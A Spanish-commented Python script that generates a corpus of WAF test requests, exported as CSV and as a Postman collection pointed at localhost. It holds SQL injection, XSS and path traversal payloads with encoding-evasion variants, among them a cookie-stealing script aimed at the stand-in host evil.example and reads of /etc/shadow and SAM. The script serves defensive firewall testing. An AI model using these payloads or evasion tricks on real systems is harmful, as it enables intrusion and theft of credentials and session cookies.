#!/usr/bin/env python3
"""Genera el corpus de casos de prueba del WAF.

Salidas (en esta misma carpeta):
  casos.csv                      -> usado por ejecutar_casos.py
  waf.postman_collection.json    -> para importar en Postman (una petición por caso)

Cada caso lleva lo que viaja "por el cable" (destino + cuerpo), de modo que el
cliente no reescribe las codificaciones. Valores de la columna `esperado`:
  403    el WAF debe bloquear
  200    tráfico legítimo: no debe bloquearse (control de falsos positivos)
  413    cuerpo demasiado grande
  no5xx  tráfico irregular: el servidor no debe fallar (400/403/404/200 son aceptables)
"""
import csv, json, os
from urllib.parse import quote

AQUI = os.path.dirname(os.path.abspath(__file__))
CASOS = []
VISTOS = set()
CONTADOR = {}
OVERSIZE = "@@OVERSIZE@@"   # el ejecutor / Postman lo reemplazan por ~1,2 MB de 'A'


def enc(s, veces=1):
    for _ in range(veces):
        s = quote(s, safe="")
    return s


def mixto(s):
    return "".join(c.upper() if i % 2 else c.lower() for i, c in enumerate(s))


def add(cat, sub, metodo, destino, ct, cuerpo, esperado="403", desc=""):
    clave = (metodo, destino, ct, cuerpo)
    if clave in VISTOS:
        return
    VISTOS.add(clave)
    CONTADOR[cat] = CONTADOR.get(cat, 0) + 1
    CASOS.append({
        "id": f"{cat}-{CONTADOR[cat]:03d}", "categoria": cat, "subtipo": sub,
        "metodo": metodo, "destino": destino, "tipo_contenido": ct,
        "cuerpo": cuerpo, "esperado": esperado, "descripcion": desc or sub,
    })


FORM = "application/x-www-form-urlencoded"
JSONCT = "application/json"


def get(cat, sub, wire, param="q", path="/search", esperado="403"):
    add(cat, sub, "GET", f"{path}?{param}={wire}", "", "", esperado, sub)


def post_form(cat, sub, wire, esperado="403"):
    add(cat, sub, "POST", "/comment", FORM, f"comentario={wire}", esperado, sub)


def post_json(cat, sub, payload, unicode_esc=False, esperado="403"):
    cuerpo = json.dumps({"comentario": payload})
    if unicode_esc:
        cuerpo = cuerpo.replace("<", "\\u003c").replace(">", "\\u003e")
    add(cat, sub, "POST", "/comment", JSONCT, cuerpo, esperado, sub)


# ------------------------------------------------------------------ bases
SQLI = [
    "' OR '1'='1", "' OR 1=1--", "admin'--", "' OR 'a'='a", "1 OR 1=1", "1' OR '1'='1'--",
    "') OR ('1'='1", "1 UNION SELECT NULL,NULL--", "' UNION SELECT username,password FROM users--",
    "1 UNION ALL SELECT 1,2,3", "1; DROP TABLE users", "1; DELETE FROM productos",
    "'; EXEC xp_cmdshell('dir')--", "1 AND SLEEP(5)", "1; WAITFOR DELAY '0:0:5'--",
    "1 AND (SELECT COUNT(*) FROM sysobjects)>0", "1 AND 1=CONVERT(int,(SELECT @@version))--",
    "' AND 1=2 UNION SELECT table_name,2 FROM information_schema.tables--", "1' ORDER BY 5--",
    "1' GROUP BY 1--", "'; SHUTDOWN--", "1; INSERT INTO usuarios VALUES (1,'x')", "' OR 1=1#",
    "' || (SELECT 1)", "' AND extractvalue(1,concat(0x7e,version()))--",
    "1 AND ASCII(SUBSTRING((SELECT TOP 1 nombre FROM productos),1,1))>64", "' OR ''='", "1 HAVING 1=1",
]
XSS = [
    "<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg onload=alert(1)>",
    "<svg/onload=alert(1)>", "<body onload=alert(1)>", "<iframe src=javascript:alert(1)></iframe>",
    "javascript:alert(document.cookie)", '<a href="javascript:alert(1)">x</a>',
    "<input onfocus=alert(1) autofocus>", "<details open ontoggle=alert(1)>",
    "<marquee onstart=alert(1)>", "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
    '"><script>alert(1)</script>', "'><img src=x onerror=alert(1)>",
    "<iframe srcdoc='<p>x</p>'></iframe>", '<object data="data:text/html,x"></object>',
    "<math><mtext><script>alert(1)</script>", "<style>@import 'http://evil.example/x.css';</style>",
    "<video><source onerror=alert(1)></video>", "<script src=//evil.example/x.js></script>",
    "<button onclick=alert(1)>x</button>", "<div onmouseover=alert(1)>x</div>",
    "<script>document.location='http://evil.example/?c='+document.cookie</script>",
    "<embed src=//evil.example/x.swf>",
]
PT = [
    "../../etc/passwd", "..\\..\\windows\\win.ini", "....//....//etc/passwd",
    "../../../../../../../etc/shadow", "/etc/passwd", "C:\\Windows\\System32\\drivers\\etc\\hosts",
    "../../boot.ini", "..;/..;/etc/passwd", "../../app/appsettings.json", "/proc/self/environ",
    "file:///etc/passwd", "..%00/etc/passwd", "..%c0%af..%c0%afetc/hosts",
    "....\\\\....\\\\windows\\\\win.ini", "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "../../../../windows/system32/config/sam", "..\\..\\..\\Windows\\System32\\config\\SAM",
    "/../../../etc/hosts",
]

# ------------------------------------------------------------------ SQLi
for p in SQLI:
    get("SQLI", "GET texto plano", enc(p))
    get("SQLI", "GET doble codificación", enc(p, 2))
    get("SQLI", "GET MAYÚSCULAS", enc(p.upper()))
    get("SQLI", "GET minúsculas", enc(p.lower()))
    get("SQLI", "GET mayús/minús alternadas", enc(mixto(p)))
    get("SQLI", "GET espacios como /**/", enc(p.replace(" ", "/**/")))
    get("SQLI", "GET espacios como +", enc(p).replace("%20", "+"))
    post_form("SQLI", "POST formulario", enc(p))
    post_form("SQLI", "POST formulario minúsculas", enc(p.lower()))
    post_json("SQLI", "POST JSON", p)
    post_json("SQLI", "POST JSON MAYÚSCULAS", p.upper())

# ------------------------------------------------------------------ XSS
ent = lambda s: s.replace("<", "&lt;").replace(">", "&gt;")
for p in XSS:
    get("XSS", "GET texto plano", enc(p))
    get("XSS", "GET doble codificación", enc(p, 2))
    get("XSS", "GET mayús/minús alternadas", enc(mixto(p)))
    get("XSS", "GET entidades HTML", enc(ent(p)))
    post_form("XSS", "POST formulario", enc(p))
    post_form("XSS", "POST formulario doble codificación", enc(p, 2))
    post_json("XSS", "POST JSON", p)
    post_json("XSS", "POST JSON con \\u003c", p, unicode_esc=True)
    post_json("XSS", "POST JSON entidades HTML", ent(p))

# ------------------------------------------------------------------ Path Traversal
for p in PT:
    get("PT", "GET texto plano", enc(p), param="name", path="/files")
    get("PT", "GET doble codificación", enc(p, 2), param="name", path="/files")
    add("PT", "Ruta codificada", "GET", "/files/" + quote(p, safe="."), "", "", "403", "Ruta codificada")
    post_form("PT", "POST formulario", enc(p))
    post_json("PT", "POST JSON", p)

# ------------------------------------------------------------------ Irregulares
A_SQL = "' OR 1=1--"
A_XSS = "<script>alert(1)</script>"
A_PT = "../../etc/passwd"
ATAQUES = [("SQLi", A_SQL), ("SQLi union", "1 UNION SELECT NULL--"), ("XSS", A_XSS),
           ("XSS onerror", "<img src=x onerror=alert(1)>"), ("PT", A_PT), ("PT win", "..\\..\\windows\\win.ini")]

for n, a in ATAQUES:
    get("IRREG", f"Parámetro duplicado ({n})", f"normal&q={enc(a)}", esperado="403")
    get("IRREG", f"Ataque en 2.º parámetro ({n})", f"1&b=2&c={enc(a)}", param="a", esperado="403")
    add("IRREG", f"Ataque en el nombre del parámetro ({n})", "GET", f"/search?{enc(a)}=1", "", "", "403")
    add("IRREG", f"Verbo PUT ({n})", "PUT", "/comment", FORM, f"comentario={enc(a)}", "403")
    add("IRREG", f"Verbo PATCH ({n})", "PATCH", "/comment", JSONCT, json.dumps({"c": a}), "403")
    add("IRREG", f"Verbo DELETE ({n})", "DELETE", f"/search?q={enc(a)}", "", "", "403")
    add("IRREG", f"Content-Type text/plain ({n})", "POST", "/comment", "text/plain", a, "403")
    add("IRREG", f"Content-Type XML ({n})", "POST", "/comment", "application/xml",
        f"<?xml version='1.0'?><c>{a}</c>", "403")
    add("IRREG", f"Multipart ({n})", "POST", "/comment", "multipart/form-data; boundary=wafb",
        f'--wafb\r\nContent-Disposition: form-data; name="c"\r\n\r\n{a}\r\n--wafb--\r\n', "403")
    add("IRREG", f"Relleno de 3 KB antes del ataque ({n})", "GET", f"/search?q={'A' * 3000}{enc(a)}", "", "", "403")
    add("IRREG", f"Cuerpo de 50 KB con ataque al final ({n})", "POST", "/comment", FORM,
        f"comentario={'A' * 50000}{enc(a)}", "403")

for esp in ("%0A", "%09", "%0D%0A", "%C2%A0"):
    get("IRREG", f"Separador {esp} entre UNION y SELECT", f"1%20UNION{esp}SELECT%20NULL--")
for k, v in [("a%00b", "byte nulo en medio"), ("%00", "solo byte nulo"), ("x%00.jpg", "extensión tras byte nulo")]:
    get("IRREG", f"Query con {v}", k)
    post_form("IRREG", f"Cuerpo con {v}", k)
get("IRREG", "Etiqueta con byte nulo", enc("<scr\x00ipt>alert(1)</scr\x00ipt>"))
get("IRREG", "Ataque combinado SQLi+XSS", enc("' OR 1=1-- <script>alert(1)</script>"))
get("IRREG", "Ataque combinado XSS+PT", enc("<img src=x onerror=alert(1)>../../etc/passwd"))
add("IRREG", "Cuerpo mayor a 1 MB (form)", "POST", "/comment", FORM, OVERSIZE, "413")
add("IRREG", "Cuerpo mayor a 1 MB (JSON)", "POST", "/comment", JSONCT, OVERSIZE, "413")
add("IRREG", "Comentario sin cerrar + relleno (ReDoS)", "POST", "/comment", FORM,
    "comentario=" + enc("UNION/*" + "A" * 50000), "no5xx")
add("IRREG", "Subconsulta sin cerrar + relleno (ReDoS)", "POST", "/comment", FORM,
    "comentario=" + enc("(select " + "a" * 50000), "no5xx")

for w, d in [("%zz", "% inválido"), ("%", "% suelto"), ("%2", "% incompleto"), ("%u003cscript%u003e", "estilo IIS %u"),
             ("%ff%fe", "bytes UTF-8 inválidos"), ("%c0%80", "UTF-8 sobrelargo de nulo"),
             ("%E0%80%AF", "UTF-8 sobrelargo de /"), ("%F0%28%8C%28", "secuencia de 4 bytes inválida")]:
    get("IRREG", f"Codificación mal formada: {d}", w, esperado="no5xx")
    post_form("IRREG", f"Cuerpo con codificación mal formada: {d}", w, esperado="no5xx")

for destino, d in [("/search?q=", "valor vacío"), ("/search?", "query vacía"), ("/search?q", "parámetro sin valor"),
                   ("/search?&&&", "solo separadores"), ("/search?q=1&q=2&q=3&q=4&q=5", "parámetro repetido"),
                   ("/search?q=%F0%9F%98%80", "emoji"), ("/search?q=%E2%80%AEtxt.exe", "carácter RTL"),
                   ("/" + "a" * 300, "ruta larga inexistente"), ("/search?q=" + "%25" * 200, "% repetido")]:
    add("IRREG", f"Irregular: {d}", "GET", destino, "", "", "no5xx")
add("IRREG", "POST con cuerpo vacío", "POST", "/comment", FORM, "", "no5xx")
add("IRREG", "POST JSON mal formado", "POST", "/comment", JSONCT, '{"comentario": ', "no5xx")
add("IRREG", "POST JSON vacío", "POST", "/comment", JSONCT, "{}", "no5xx")
add("IRREG", "POST binario simulado", "POST", "/comment", "application/octet-stream", "%00%01%02%FF", "no5xx")

# ------------------------------------------------------------------ Tráfico legítimo (falsos positivos)
LEGIT_Q = [
    "zapatos rojos", "iphone 15 pro 256gb", "pan & queso", "café con leche", "100% algodón", "C++ y C#",
    "ana.gomez@correo.com", "--help", 'dijo "hola" y se fue', "it's a nice day", "O'Reilly", "D'Angelo",
    "2020-2024", "select an option from the list", "Please select your size", "union station", "order by date",
    "having fun", "rock and roll or jazz", "drop shipping", "Tom's and Jerry's", "5 > 3", "1 < 2", "I <3 you",
    "precio: $1.500.000", "https://tienda.example/producto?id=5", "ropa de niño", "Ñandú", "camisa 2x1 & envío gratis",
    "tabla de multiplicar", "una consulta sobre mi pedido", "script de teatro", "alert system manual",
    "document cookie recipe", "windows de aluminio", "mesa 3 sillas", "barra de herramientas", "a/b testing",
    "path to success", "etc etcétera",
]
for i, q in enumerate(LEGIT_Q):
    get("LEGIT", "GET legítimo", enc(q), esperado="200")
    if i % 2 == 0:
        post_form("LEGIT", "POST formulario legítimo", enc(q), esperado="200")
    else:
        post_json("LEGIT", "POST JSON legítimo", q, esperado="200")
get("LEGIT", "GET /files legítimo", enc("manual-usuario.pdf"), param="name", path="/files", esperado="200")
get("LEGIT", "GET /files con subcarpeta", enc("docs/manual.pdf"), param="name", path="/files", esperado="200")
add("LEGIT", "GET raíz", "GET", "/", "", "", "200")

# ------------------------------------------------------------------ Salida
CAMPOS = ["id", "categoria", "subtipo", "metodo", "destino", "tipo_contenido", "cuerpo", "esperado", "descripcion"]
with open(os.path.join(AQUI, "casos.csv"), "w", newline="", encoding="utf-8") as f:
    w = csv.DictWriter(f, fieldnames=CAMPOS)
    w.writeheader()
    w.writerows(CASOS)


def test_script(esperado):
    if esperado == "no5xx":
        cuerpo = "pm.expect(pm.response.code).to.be.below(500);"
        nombre = "no hay error 5xx"
    else:
        cuerpo = f"pm.response.to.have.status({esperado});"
        nombre = f"estado {esperado}"
    return {"listen": "test", "script": {"type": "text/javascript",
            "exec": [f"pm.test('{nombre}', function () {{ {cuerpo} }});"]}}


carpetas = {}
for c in CASOS:
    headers = [{"key": "Content-Type", "value": c["tipo_contenido"]}] if c["tipo_contenido"] else []
    cuerpo = c["cuerpo"]
    eventos = [test_script(c["esperado"])]
    if cuerpo == OVERSIZE:
        cuerpo = "{{cuerpoGrande}}"
        eventos.insert(0, {"listen": "prerequest", "script": {"type": "text/javascript",
                           "exec": ["pm.variables.set('cuerpoGrande', 'comentario=' + 'A'.repeat(1200000));"]}})
    req = {"method": c["metodo"], "header": headers, "url": "{{baseUrl}}" + c["destino"]}
    if cuerpo:
        req["body"] = {"mode": "raw", "raw": cuerpo}
    carpetas.setdefault(c["categoria"], []).append(
        {"name": f'{c["id"]} · {c["subtipo"]}', "event": eventos, "request": req})

NOMBRES = {"SQLI": "Inyección SQL", "XSS": "Cross-Site Scripting", "PT": "Path Traversal",
           "IRREG": "Conexiones irregulares", "LEGIT": "Tráfico legítimo (no debe bloquearse)"}
coleccion = {
    "info": {"name": "WAF - casos de prueba", "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"},
    "variable": [{"key": "baseUrl", "value": "http://localhost:5080"}],
    "item": [{"name": NOMBRES[k], "item": v} for k, v in carpetas.items()],
}
with open(os.path.join(AQUI, "waf.postman_collection.json"), "w", encoding="utf-8") as f:
    json.dump(coleccion, f, ensure_ascii=False, indent=1)

malos = [c for c in CASOS if c["categoria"] != "LEGIT"]
print(f"Total de casos: {len(CASOS)}  |  irregulares/ataque: {len(malos)}  |  legítimos: {len(CASOS) - len(malos)}")
for k, v in CONTADOR.items():
    print(f"  {k:6s} {v}")
